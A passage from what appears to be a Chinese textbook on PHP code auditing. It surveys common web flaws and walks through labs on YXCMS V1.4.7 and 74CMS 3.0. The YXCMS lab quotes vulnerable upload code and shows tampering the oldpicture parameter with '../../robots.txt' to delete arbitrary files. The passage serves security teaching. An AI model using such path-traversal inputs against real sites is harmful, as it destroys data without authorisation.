l \u5BF9\u7BA1\u7406\u6587\u4EF6\u540D\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u5BFC\u81F4JS\u6076\u610F\u4EE3\u7801\u6216SQL\u8BED\u53E5\u901A\u8FC7\u6587\u4EF6\u540D\u5B58\u50A8\u5230\u6570\u636E\u5E93\u4E2D\uFF0C\u5F62\u6210\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u6216SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
\uFF085\uFF09  \u767B\u5F55\u8BA4\u8BC1\u529F\u80FD\u5E38\u89C1\u6F0F\u6D1E\u5305\u62EC\uFF1A\r
\r
l \u901A\u8FC7\u67E5\u770B\u7F51\u7AD9\u767B\u5F55\u7528\u6237\u7684Cookie\u5206\u6790\u7528\u6237\u8D26\u6237\u4FE1\u606F\u4ECE\u800C\u4F2A\u9020\u7F51\u7AD9\u8BA4\u8BC1\u4EE4\u724C\uFF0C\u6216\u76F4\u63A5\u83B7\u5F97\u7528\u6237\u540D\u7B49\u4FE1\u606F\uFF0C\u9020\u6210\u8D8A\u6743\u6F0F\u6D1E\u3002\r
\r
l \u5BF9\u654F\u611F\u529F\u80FD\u70B9\u672A\u8FDB\u884Ctoken\u8BA4\u8BC1\uFF0C\u4ECE\u800C\u9020\u6210CSRF\u6F0F\u6D1E\u3002\r
\r
\uFF086\uFF09  \u6570\u636E\u5E93\u5907\u4EFD\u4E0E\u6062\u590D\u529F\u80FD\u5E38\u89C1\u6F0F\u6D1E\u5305\u62EC\uFF1A\r
\r
l \u7F51\u7AD9\u4E2D\u5BF9\u654F\u611F\u53C2\u6570\u8FC7\u6EE4\u4E0D\u4E25\u683C\u4E14\u5B58\u5728shell_exec\u51FD\u6570\uFF0C\u5BFC\u81F4\u5B58\u5728\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3002\r
\r
\uFF087\uFF09  \u627E\u56DE\u5BC6\u7801\u529F\u80FD\u5E38\u89C1\u6F0F\u6D1E\u5305\u62EC\uFF1A\r
\r
l \u7F51\u7AD9\u4E2D\u56DB\u4F4D\u9A8C\u8BC1\u7801\u8FC7\u671F\u65F6\u95F4\u8FC7\u957F\u5BFC\u81F4\u9A8C\u8BC1\u7801\u7206\u7834\u60C5\u51B5\uFF0C\u4ECE\u800C\u83B7\u5F97\u975E\u6CD5\u6743\u9650\u3002\r
\r
l \u627E\u56DE\u5BC6\u7801\u4E1A\u52A1\u903B\u8F91\u8FC7\u4E8E\u7B80\u5355\u5BFC\u81F4\u7684\u66B4\u529B\u7834\u89E3\u7528\u6237\u5BC6\u7801\u60C5\u51B5\u3002\r
\r
### 2.4.4 \u5B9E\u9A8C\uFF1A\u5B9A\u5411\u529F\u80FD\u6CD5\u5206\u6790YXCMS\u56FE\u7247\u4E0A\u4F20\u529F\u80FD\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u4EE5YXCMS V1.4.7\u4E3A\u4F8B\uFF0C\u4F7F\u7528\u5B9A\u5411\u529F\u80FD\u6CD5\u5BA1\u8BA1\u8BE5\u7F51\u7AD9\u7684\u56FE\u7247\u4E0A\u4F20\u529F\u80FD\uFF0C\u8BA9\u8BFB\u8005\u7406\u89E3\u5B9A\u5411\u529F\u80FD\u5206\u6790\u6CD5\u7684\u5BA1\u8BA1\u6B65\u9AA4\uFF0C\u8BE5\u6848\u4F8B\u5BA1\u8BA1\u7684\u529F\u80FD\u70B9\u5982\u56FE2-11\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image156.jpg)\r
\r
\u56FE2-11 \u5B9A\u5411\u529F\u80FD\u5206\u6790\u6CD5\u6D41\u7A0B\u56FE\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80032.4.3\u8282\uFF1A\u5B9A\u5411\u529F\u80FD\u5206\u6790\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u4E86\u89E3\u5B9A\u5411\u529F\u80FD\u5206\u6790\u5BA1\u8BA1\u6D41\u7A0B\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BYXCMS V1.4.7\u73AF\u5883\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\u8BBF\u95EE\u94FE\u63A5\u201Chttp://ip/YXCMS/index.php?r=admin/index/index#\u201D\u8FDB\u5165\u7BA1\u7406\u5458\u540E\u53F0\u9875\u9762\uFF0C\u70B9\u51FB\u201C\u5185\u5BB9\u7BA1\u7406\u201D->\u201C\u94FE\u63A5\u5217\u8868\u201D->\u201C\u7F16\u8F91\u201D\u6309\u94AE\u8FDB\u5165\u5230\u672C\u6B21\u5B9E\u9A8C\u5206\u6790\u7684\u529F\u80FD\u9875\u9762\u3002\u4F7F\u7528BurpSuite\u62E6\u622A\u70B9\u51FB\u201C\u9009\u62E9\u6587\u4EF6\u201D\u65F6\u53D1\u9001\u7684\u8BF7\u6C42\u6570\u636E\u5305\uFF0C\u5176\u53D1\u9001\u7684\u8BF7\u6C42\u4E3A\u201Chttp://ip/YXCMS/index.php?r=admin/link/edit&id=3\u201D\u3002\r
\r
   \u8BE5\u8BF7\u6C42\u5C06\u53D1\u9001\u81F3\u540E\u53F0\u4EE3\u7801protected\\apps\\admin\\controller\\linkController.php\u7684edit\u65B9\u6CD5\u4E2D\u5904\u7406\uFF0C\u901A\u8FC7\u5206\u6790\u53EF\u77E5\u8BE5\u8BF7\u6C42\u7684\u6838\u5FC3\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
if (empty($_FILES['picture']['name']) === false){\r
\r
  $imgupload= $this->upload($this->uploadpath,config('imgupSize'),'jpg,bmp,gif,png');\r
\r
  if(!empty($_POST['oldpicture'])){\r
\r
\u200B    **$picpath=$this->uploadpath.$_POST['oldpicture'];**\r
\r
\u200B    **if(file_exists($picpath)) @unlink($picpath);**\r
\r
$imgupload->saveRule=substr($_POST['oldpicture'],0,strrpos($_POST['oldpicture'],'.'));\r
\r
\u200B    $imgupload->uploadReplace=true;//\u91CD\u540D\u5219\u8986\u76D6}\r
\r
\u200B    $imgupload->upload();\r
\r
\u200B    $fileinfo=$imgupload->getUploadFileInfo();\r
\r
\u200B    $errorinfo=$imgupload->getErrorMsg();\r
\r
\u200B    if(!empty($errorinfo)) $this->alert($errorinfo);\r
\r
\u200B    $data['picture']=$fileinfo[0]['savename'];\r
\r
\u200B    $mes='logo\u5DF2\u7ECF\u4E0A\u4F20\uFF0C';}\r
\r
\r
\r
\u4EE3\u7801\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u8BBE\u7F6E\u6587\u4EF6\u4E0A\u4F20\u7684\u8DEF\u5F84\u3001\u56FE\u7247\u5927\u5C0F\u3001\u540E\u7F00\u540D\uFF0C\u9650\u5236\u540E\u7F00\u540D\u4E3Ajpg\u3001bmp\u3001gif\u3001png\u3002\r
\r
l \u5224\u65AD\u539F\u59CB\u56FE\u7247\u6587\u4EF6$oldpicture\u53D8\u91CF\u662F\u5426\u4E3A\u7A7A\uFF0C\u82E5\u4E0D\u4E3A\u7A7A\u5219\u5224\u65AD\u8BE5\u6587\u4EF6\u662F\u5426\u5B58\u5728\uFF0C\u82E5\u5B58\u5728\u5219\u8FDB\u884C\u5220\u9664\uFF1B\r
\r
l \u8BBE\u7F6E\u65B0\u56FE\u7247\u540D\u79F0\u5E76\u8FDB\u884C\u4E0A\u4F20\u3002\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u63A5\u6536\u7684\u53C2\u6570$oldpicture\u672A\u7ECF\u8FC7\u6821\u9A8C\uFF0C\u5C31\u76F4\u63A5\u7528\u6765\u5220\u9664\u6587\u4EF6\u3002\u540C\u65F6\uFF0C\u53C2\u6570$oldpicture\u8FD8\u53EF\u901A\u8FC7BurpSuite\u62E6\u622A\u6570\u636E\u5305\u8FDB\u884C\u4FEE\u6539\u3002\u56E0\u6B64\uFF0C\u7528\u6237\u53EF\u4EE5\u901A\u8FC7\u7BE1\u6539\u8BE5\u53D8\u91CF\u9020\u6210\u4EFB\u610F\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u3002\u5C06\u62E6\u622A\u7684\u53C2\u6570$oldpicture\u4FEE\u6539\u4E3A\u201C../../robots.txt\u201D\u4ECE\u800C\u5220\u9664\u4E86\u7F51\u7AD9\u6839\u8DEF\u5F84\u4E0B\u7684robots.txt\u6587\u4EF6\uFF0C\u5982\u56FE2-12\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image158.jpg)\r
\r
\u56FE2-12 \u5B9A\u5411\u529F\u80FD\u5206\u6790\u6CD5\u6D41\u7A0B\u56FE\r
\r
  \u81F3\u6B64\uFF0C\u4EE5\u4E0A\u8FF0\u6848\u4F8B\u6F14\u793A\u4E86\u5B9A\u5411\u529F\u80FD\u6CD5\u7684\u57FA\u672C\u6D41\u7A0B\u3002\u901A\u8FC7\u5206\u6790CMS\u4E2D\u56FE\u7247\u4E0A\u4F20\u529F\u80FD\uFF0C\u4ECE\u800C\u63A8\u6D4B\u51FA\u8BE5\u529F\u80FD\u53EF\u80FD\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\uFF0C\u7136\u540E\u5BA1\u8BA1\u8BE5\u4E0A\u4F20\u529F\u80FD\u5BF9\u5E94\u7684\u4EE3\u7801\u5E76\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u6700\u540E\u5F97\u51FA\u7ED3\u679C\u3002\r
\r
### 2.4.5 \u901A\u8BFB\u5168\u6587\u6CD5\r
\r
\u901A\u8BFB\u5168\u6587\u6CD5\u9700\u8981\u5BA1\u8BA1\u4EBA\u5458\u7740\u91CD\u5173\u6CE8\u7A0B\u5E8F\u7684\u6587\u4EF6\u3001\u7ED3\u6784\u3001\u529F\u80FD\u3002\u800C\u4E0D\u662F\u5C06\u6574\u4E2A\u9879\u76EE\u4EE3\u7801\u8FDB\u884C\u9605\u8BFB\uFF0C\u8FC7\u4E8E\u4ED4\u7EC6\u7684\u9605\u8BFB\u4EE3\u7801\u5C06\u5BFC\u81F4\u6574\u5957Web\u7A0B\u5E8F\u96BE\u4EE5\u5206\u6790\u3002\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u6709\u4FA7\u91CD\u70B9\u7684\u5173\u6CE8\u90E8\u5206\u4EE3\u7801\uFF0C\u53EF\u4EE5\u907F\u514D\u56E0\u4EE3\u7801\u91CF\u8FC7\u5927\u800C\u5BFC\u81F4\u7684\u5BA1\u8BA1\u76F2\u76EE\u3002\u4F5C\u4E3A\u4E00\u540D\u521D\u5B66\u8005\uFF0C\u5EFA\u8BAE\u5148\u4ECE\u7B80\u5355\u5E94\u7528\u6E90\u7801\u7F51\u7AD9\u8D70\u8BFB\u5F00\u59CB\uFF0C\u6216\u5BFB\u627E\u7F51\u7EDC\u4E0ACTF\u4EE3\u7801\u5BA1\u8BA1\u7684\u7B80\u5355\u9898\u76EE\u5F00\u59CB\u8D70\u8BFB\uFF0C\u5148\u5927\u4F53\u4E86\u89E3\u6587\u4EF6\u4E2D\u4EE3\u7801\u6D41\u7A0B\uFF0C\u518D\u6709\u9488\u5BF9\u6027\u7684\u5BFB\u627E\u654F\u611F\u51FD\u6570\u8FDB\u884C\u5206\u6790\u3002\u6700\u540E\u518D\u4E86\u89E3\u5E38\u89C1\u7684CMS\u7ED3\u6784\u53CAPHP\u5F00\u6E90\u6846\u67B6\uFF08\u4F8B\u5982\uFF1AThinkPHP\u3001Yii\u3001Zend Framework\u7B49\uFF09\u4ECE\u800C\u63D0\u5347\u4EE3\u7801\u8D70\u8BFB\u80FD\u529B\u3002\r
\r
\u4E0B\u9762\u5C06\u4ECE\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u901A\u8BFB\u5168\u6587\u6CD5\u7684\u4F18\u52A3\u3001\u65B9\u6CD5\u3001\u5173\u952E\u6587\u4EF6\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
1\u3001\u901A\u8BFB\u5168\u6587\u6CD5\u7684\u4F18\u52A3\uFF1A\r
\r
l \u4F18\u70B9\uFF1A\u66F4\u597D\u7684\u7406\u89E3\u7A0B\u5E8F\u6846\u67B6\u548C\u4E1A\u52A1\u903B\u8F91\uFF0C\u53EF\u4EE5\u6316\u6398\u51FA\u66F4\u591A\u9AD8\u8D28\u91CF\u6F0F\u6D1E\uFF1B\r
\r
l \u7F3A\u70B9\uFF1A\u8017\u8D39\u65F6\u95F4\u7CBE\u529B\uFF0C\u5BF9\u719F\u6089\u4EE3\u7801\u8D70\u8BFB\u7684\u6709\u7ECF\u9A8C\u8005\u6BD4\u8F83\u9002\u5408\uFF0C\u5BF9\u521D\u5B66\u8005\u96BE\u5EA6\u8F83\u5927\u3002\r
\r
2\u3001\u901A\u8BFB\u5168\u6587\u6CD5\u9700\u8981\u4E86\u89E3\u7684\u5185\u5BB9\uFF1A\r
\r
l \u7A0B\u5E8F\u7684\u5927\u4F53\u76EE\u5F55\u7ED3\u6784\uFF1B\r
\r
l \u7A0B\u5E8F\u4E2D\u4E3B\u8981\u76EE\u5F55\u6587\u4EF6\u7684\u4E86\u89E3\uFF0C\u4F8B\u5982\uFF1A\u4E3B\u76EE\u5F55\u3001\u6A21\u5757\u76EE\u5F55\u3001\u63D2\u4EF6\u76EE\u5F55\uFF1B\r
\r
l \u7A0B\u5E8F\u4E2D\u6587\u4EF6\u7684\u5927\u5C0F\u53CA\u521B\u5EFA\u65F6\u95F4\uFF1B\r
\r
l \u6839\u636E\u6587\u4EF6\u547D\u540D\u731C\u6D4B\u7A0B\u5E8F\u53EF\u80FD\u5B9E\u73B0\u7684\u529F\u80FD\u3002\r
\r
3\u3001\u5728\u8FDB\u884C\u7A0B\u5E8F\u76EE\u5F55\u7ED3\u6784\u6982\u89C8\u65F6\uFF0C\u901A\u5E38\u9700\u8981\u6CE8\u610F\u4EE5\u4E0B\u5173\u952E\u70B9\uFF1A\r
\r
l \u7F51\u7AD9\u5165\u53E3\u6587\u4EF6\r
\r
\u7F51\u7AD9\u7684\u5165\u53E3\u6587\u4EF6\u662F\u6BCF\u4E2A\u7A0B\u5E8F\u7684\u5165\u53E3\uFF0C\u5E38\u89C1\u7684\u6587\u4EF6\u6709\uFF1Aadmin.php\u3001index.php\u7B49\u3002\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u5E94\u9996\u5148\u6D4F\u89C8\u7F51\u7AD9\u76EE\u5F55\u4E2D\u7684index.php\u6587\u4EF6\uFF0C\u4ECE\u800C\u5BF9\u7A0B\u5E8F\u7684\u67B6\u6784\u3001\u6267\u884C\u6D41\u7A0B\u3001\u5305\u542B\u7684\u914D\u7F6E\u6587\u4EF6\u3001\u5305\u542B\u7684\u8FC7\u6EE4\u6587\u4EF6\u6709\u5927\u81F4\u4E86\u89E3\u3002\r
\r
l \u914D\u7F6E\u6587\u4EF6\r
\r
\u901A\u5E38\u6587\u4EF6\u540D\u5305\u542Bconfig\u5173\u952E\u5B57\u7684\u6587\u4EF6\uFF0C\u5E38\u89C1\u6587\u4EF6\u6709\uFF1Aconfig.php\u7B49\u3002\u6B64\u7C7B\u6587\u4EF6\u4E2D\u5305\u62EC\uFF1A\u6570\u636E\u5E93\u914D\u7F6E\u4FE1\u606F\u3001\u7A0B\u5E8F\u8FD0\u884C\u914D\u7F6E\u4FE1\u606F\u7B49\u3002\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u9700\u67E5\u770B\u6570\u636E\u5E93\u7F16\u7801\u3001\u82E5\u4F7F\u7528GBK\u7F16\u7801\u5219\u53EF\u80FD\u5B58\u5728\u5BBD\u5B57\u8282\u6CE8\u5165\u6F0F\u6D1E\u3002\u540C\u65F6\uFF0C\u82E5\u914D\u7F6E\u6761\u76EE\u7684\u53C2\u6570\u503C\u4F7F\u7528\u4E86\u53CC\u5F15\u53F7\uFF0C\u5219\u53EF\u80FD\u5B58\u5728\u53CC\u5F15\u53F7\u89E3\u6790\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3002\r
\r
l \u8FC7\u6EE4\u529F\u80FD\r
\r
\u8BE6\u7EC6\u8D70\u8BFB\u201C\u516C\u5171\u51FD\u6570\u6587\u4EF6\u201D\u548C\u201C\u5B89\u5168\u8FC7\u6EE4\u6587\u4EF6\u201D\u4EE3\u7801\uFF0C\u9700\u8981\u5B8C\u5168\u638C\u63E1\u7528\u6237\u7684\u8F93\u5165\u6570\u636E\u5728\u7A0B\u5E8F\u4E2D\u7684\u4F20\u9012\u8FC7\u7A0B\uFF0C\u4E3B\u8981\u5173\u6CE8\u70B9\u5982\u4E0B\uFF1A\r
\r
  \u7528\u6237\u8F93\u5165\u53C2\u6570\u4E2D\u6709\u54EA\u4E9B\u88AB\u7A0B\u5E8F\u8FC7\u6EE4\u3002\r
\r
  \u7A0B\u5E8F\u4E2D\u4F7F\u7528\u7684\u8FC7\u6EE4\u7B97\u6CD5\u662F\u4EC0\u4E48\u3002\r
\r
  \u8FC7\u6EE4\u7B97\u6CD5\u662F\u5426\u5B58\u5728\u6F0F\u6D1E\u9020\u6210\u7ED5\u8FC7\u60C5\u51B5\u3002\r
\r
  \u6574\u4F53\u7A0B\u5E8F\u4E2D\u662F\u5426\u5F00\u542F\u7684GPC\u6821\u9A8C\u3002\r
\r
  \u7528\u6237\u8F93\u5165\u53C2\u6570\u662F\u5426\u91C7\u7528addslashes\u51FD\u6570\u8FC7\u6EE4\u3002\r
\r
  \u7528\u6237\u8F93\u5165\u53C2\u6570\u7684\u8FC7\u6EE4\u65B9\u5F0F\u662F\u66FF\u6362\u65B9\u5F0F\u8FD8\u662F\u6B63\u5219\u5339\u914D\u65B9\u5F0F\u3002\r
\r
l \u7F51\u7AD9\u7684\u8DEF\u7531\u60C5\u51B5\r
\r
\u7F51\u7AD9\u7684\u6267\u884C\u6D41\u7A0B\u4E00\u822C\u90FD\u662F\u4ECE\u524D\u53F0\u9875\u9762\u4F20\u9012\u6570\u636E\uFF0C\u540E\u53F0\u63A5\u6536\u6570\u636E\u5E76\u5904\u7406\u3002\u4E00\u822C\u5C06\u4ECE\u524D\u53F0\u9875\u9762\u5230\u540E\u53F0\u4EE3\u7801\u5904\u7406\u7684\u8FC7\u7A0B\u79F0\u4E3A\u8DEF\u7531\u3002\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u524D\u4E86\u89E3CMS\u7684\u8DEF\u7531\u60C5\u51B5\u683C\u5916\u91CD\u8981\uFF0C\u53EA\u6709\u5BF9\u8DEF\u7531\u4E86\u89E3\u624D\u80FD\u5728\u53D1\u73B0\u6F0F\u6D1E\u540E\uFF0C\u5206\u6790\u5982\u4F55\u5229\u7528\u8BE5\u6F0F\u6D1E\u3002\u901A\u5E38\u5206\u6790\u8DEF\u7531\u60C5\u51B5\u65B9\u6CD5\u5305\u62EC\uFF1A\r
\r
  \u9759\u6001\u641C\u7D22\uFF1A\u641C\u7D22\u5305\u542B\u201Croute\u201D\u5173\u952E\u5B57\u7684\u8DEF\u7531\u6587\u4EF6\u540D\u79F0\u6216\u8DEF\u7531\u65B9\u6CD5\u3002\r
\r
  \u52A8\u6001\u8C03\u8BD5\uFF1A\u53D1\u9001\u4E00\u4E2AHTTP\u8BF7\u6C42\uFF0C\u5206\u6790\u6570\u636E\u7684\u5904\u7406\u6D41\u7A0B\uFF0C\u5BF9\u8DEF\u7531\u60C5\u51B5\u8FDB\u884C\u4E86\u89E3\u3002\r
\r
### 2.4.6 \u5B9E\u9A8C\uFF1A\u901A\u8BFB\u5168\u6587\u6CD5\u5206\u679074CMS\u6848\u4F8B\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
74CMS\u662F\u4E00\u6B3E\u57FA\u4E8EPHP\u4E0EMySQL\u4E3A\u6838\u5FC3\u5F00\u53D1\u7684\u4E00\u6B3E\u5F00\u6E90\u7684\u4EBA\u624D\u62DB\u8058\u7CFB\u7EDF\u300274CMS3.0\u7248\u672C\u53D1\u5E03\u5C31\u88AB\u5B89\u5168\u5BA1\u8BA1\u4EBA\u5458\u53D1\u73B0\u6F0F\u6D1E\u3002\u672C\u5B9E\u9A8C\u4F7F\u7528\u901A\u8BFB\u5168\u6587\u6CD5\u5BF9\u8BE5CMS\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\uFF0C\u901A\u8BFB\u5168\u6587\u5BA1\u8BA1\u6CD5\u9700\u8981\u5BF9\u8BE5\u7A0B\u5E8F\u4E2D\u6240\u6709\u6838\u5FC3\u4EE3\u7801\u8FDB\u884C\u4EE3\u7801\u8D70\u8BFB\uFF0C\u672C\u5B9E\u9A8C\u53EA\u5BF9\u7A0B\u5E8F\u90E8\u5206\u5165\u53E3\u6587\u4EF6\u8FDB\u884C\u5206\u6790\uFF0C\u610F\u5728\u4F7F\u8BFB\u8005\u4E86\u89E3\u5206\u6790\u8FC7\u7A0B\uFF0C\u8BF7\u8BFB\u8005\u7ED3\u5408\u4E0A\u8282\u63D0\u51FA\u901A\u8BFB\u5168\u6587\u65B9\u6CD5\u8FDB\u884C\u7406\u89E3\u4E0E\u603B\u7ED3\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80032.4.5\u8282\uFF1A\u901A\u8BFB\u5168\u6587\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u901A\u8BFB\u5168\u6587\u6CD5\u9700\u5BA1\u8BA1\u7684\u91CD\u8981\u6587\u4EF6\uFF1B\r
\r
\u4E86\u89E3\u901A\u8BFB\u5168\u6587\u6CD5\u5BA1\u8BA1\u6D41\u7A0B\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1B 74CMS3.0\u73AF\u5883\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u4E86\u89E3\u7A0B\u5E8F\u7684\u5927\u4F53\u76EE\u5F55\u7ED3\u6784\u3002\r
\r
\u4E86\u89E3\u7A0B\u5E8F\u76EE\u5F55\u7ED3\u6784\u662F\u4EE3\u7801\u5BA1\u8BA1\u521D\u671F\u7684\u5FC5\u5907\u5DE5\u4F5C\uFF0C\u5176\u65B9\u6CD5\u4E3B\u8981\u5305\u62EC\uFF1A\r
\r
l \u901A\u8FC7\u67E5\u9605\u7A0B\u5E8F\u529F\u80FD\u8BF4\u660E\u6587\u6863\u4E86\u89E3\u6587\u4EF6\u529F\u80FD\u3002\r
\r
l \u901A\u8FC7\u6587\u4EF6\u540D\u79F0\u4E86\u89E3CMS\u6587\u4EF6\u5939\u4F5C\u7528\u3002\r
\r
l \u67E5\u770B\u8BE5\u6587\u4EF6\u5939\u4E0B\u5B58\u653E\u5185\u5BB9\u5206\u6790\u5224\u65AD\u6587\u4EF6\u5939\u7684\u542B\u4E49\u3002\r
\r
\u7ECF\u8FC7\u5206\u6790\u53EF\u77E574CMS\u76EE\u5F55\u7ED3\u6784\u5982\u88682-1\u6240\u793A\u3002\r
\r
\u88682-1 74CMS\u6587\u4EF6\u76EE\u5F55\u7ED3\u6784\r
\r
| **\u6587\u4EF6\u540D**      | **\u6587\u4EF6\u4F5C\u7528**             | **\u6587\u4EF6\u5C5E\u6027**       |\r
| --------------- | ------------------------ | ------------------ |\r
| admin\u6587\u4EF6\u5939     | \u5B58\u653E\u540E\u53F0\u7BA1\u7406\u5458\u76F8\u5173\u6587\u4EF6   | \u4E3B\u76EE\u5F55\uFF08\u9700\u5BA1\u8BA1\uFF09   |\r
| data\u6587\u4EF6\u5939      | \u5728\u6587\u4EF6\u5939\u4E3B\u8981\u5B58\u653E\u9759\u6001\u9875\u9762 | \u65E0\u4EE3\u7801\uFF08\u53EF\u4E0D\u5BA1\u8BA1\uFF09 |\r
| api\u6587\u4EF6\u5939       | \u63A5\u53E3\u8BBE\u7F6E\u6587\u4EF6\u5939           | \u9700\u5BA1\u8BA1             |\r
| include\u6587\u4EF6\u5939   | \u5305\u542B\u5168\u5C40\u6587\u4EF6             | \u4E3B\u76EE\u5F55\uFF08\u9700\u5BA1\u8BA1\uFF09   |\r
| install\u6587\u4EF6\u5939   | \u7F51\u7AD9\u5B89\u88C5\u8DEF\u5F84             | \u53EF\u4E0D\u5BA1\u8BA1           |\r
| templates\u6587\u4EF6\u5939 | \u6A21\u677F\u9759\u6001\u6587\u4EF6\u5939           | \u53EF\u4E0D\u5BA1\u8BA1           |\r
| user\u6587\u4EF6\u5939      | \u7528\u6237\u4EE3\u7801\u6838\u5FC3\u6A21\u5757         | \u4E3B\u76EE\u5F55\uFF08\u9700\u5BA1\u8BA1\uFF09   |\r
| company\u6587\u4EF6\u5939   | \u4F01\u4E1A\u4EE3\u7801\u6A21\u5757             | \u4E3B\u76EE\u5F55\uFF08\u9700\u5BA1\u8BA1\uFF09   |\r
| jobs\u6587\u4EF6\u5939      | \u804C\u4E1A\u4EE3\u7801\u6A21\u5757             | \u4E3B\u76EE\u5F55\uFF08\u9700\u5BA1\u8BA1\uFF09   |\r
| resume\u6587\u4EF6\u5939    | \u7B80\u5386\u4EE3\u7801\u6A21\u5757             | \u4E3B\u76EE\u5F55\uFF08\u9700\u5BA1\u8BA1\uFF09   |\r
| simple          | \u5FAE\u62DB\u8058\u4EE3\u7801\u6A21\u5757           | \u4E3B\u76EE\u5F55\uFF08\u9700\u5BA1\u8BA1\uFF09   |\r
| index.php\u6587\u4EF6   | \u9996\u9875\u51FD\u6570\u5165\u53E3             | \u4E3B\u76EE\u5F55\uFF08\u9700\u5BA1\u8BA1\uFF09   |\r
| \u5176\u4ED6php\u6587\u4EF6     | \u7701\u7565                     | \u7701\u7565               |\r
\r
\uFF082\uFF09  \u5BF9\u5165\u53E3\u6587\u4EF6\u5173\u952E\u4EE3\u7801\u8FDB\u884C\u5BA1\u8BA1\u3002\r
\r
\u672C\u5C0F\u8282\u5BF9CMS\u4E2D\u7684\u90E8\u5206\u516C\u5171\u51FD\u6570\u3001\u914D\u7F6E\u6587\u4EF6\u3001\u5B89\u5168\u8FC7\u6EE4\u6587\u4EF6\u8FDB\u884C\u4EE3\u7801\u8D70\u8BFB\uFF0C\u4ECE\u800C\u5BF9\u7A0B\u5E8F\u8FDB\u4E00\u6B65\u4E86\u89E3\u3002\u672C\u8282\u4ECB\u7ECD\u90E8\u5206\u901A\u8BFB\u5168\u6587\u5BA1\u8BA1\u6D41\u7A0B\uFF0C\u5982\u56FE2-13\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image160.jpg)\r
\r
\u56FE2-13 \u901A\u8BFB\u5168\u6587\u5BA1\u8BA1\u6D41\u7A0B\u56FE\r
\r
l index.php\u5165\u53E3\u6587\u4EF6\u5BA1\u8BA1\r
\r
\u57FA\u672C\u6240\u6709\u7684\u901A\u8BFB\u5168\u6587\u6CD5\u90FD\u8981\u4ECE\u9996\u9875\u7684index.php\u6587\u4EF6\u5F00\u59CB\u5BA1\u8BA1\uFF0C\u6D41\u7A0B\u4E3A\uFF1A\r
\r
  \u8BE5\u6587\u4EF6\u4F7F\u7528require_once\u51FD\u6570\u5305\u542B\u4E24\u4E2A\u6587\u4EF6\uFF1Ainclude/common.inc.php\u6587\u4EF6\u548Cinclude/mysql.class.php\u6587\u4EF6\u3002\r
\r
  \u5224\u65AD\u5F53\u524D\u9875\u9762\u662F\u5426\u5B58\u5728\u7F13\u5B58chaching\uFF0C\u901A\u8FC7\u4F20\u9012\u53C2\u6570\u62FC\u63A5\u4E3A\u53D8\u91CF$cached_id\u3002\r
\r
  \u6839\u636E\u6570\u636E\u5E93\u7684\u4E3B\u673A\u540D\u3001\u7528\u6237\u540D\u3001\u5BC6\u7801\u8FDB\u884C\u6570\u636E\u5E93\u8FDE\u63A5\uFF0C\u5E76\u6839\u636E$cached_id\u663E\u793A\u9875\u9762\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image162.jpg)\r
\r
\u56FE2-14 \u9996\u9875index.php\u6587\u4EF6\u4EE3\u7801\r
\r
l common.inc.php\u901A\u7528\u51FD\u6570\u6587\u4EF6\u5BA1\u8BA1\r
\r
common.inc.php\u6587\u4EF6\u662F\u901A\u7528\u51FD\u6570\u96C6\u6587\u4EF6\u5982\u56FE2-15\u6240\u793A\uFF0C\u6D41\u7A0B\u4E3A\uFF1A\r
\r
  \u8BE5\u6587\u4EF6\u5305\u542B\u4E09\u4E2A\u6587\u4EF6\uFF1Adata/config.php\u6587\u4EF6\u3001include/common.fun.php\u6587\u4EF6\u3001include/74cms_version.php\u6587\u4EF6\u3002\r
\r
  \u4F7F\u7528addslashes_deep\u51FD\u6570\u5BF9GET\u3001POST\u3001COOKIE\u65B9\u6CD5\u4F20\u9012\u7684\u53C2\u6570\u8FDB\u884C\u8FC7\u6EE4\u3002\r
\r
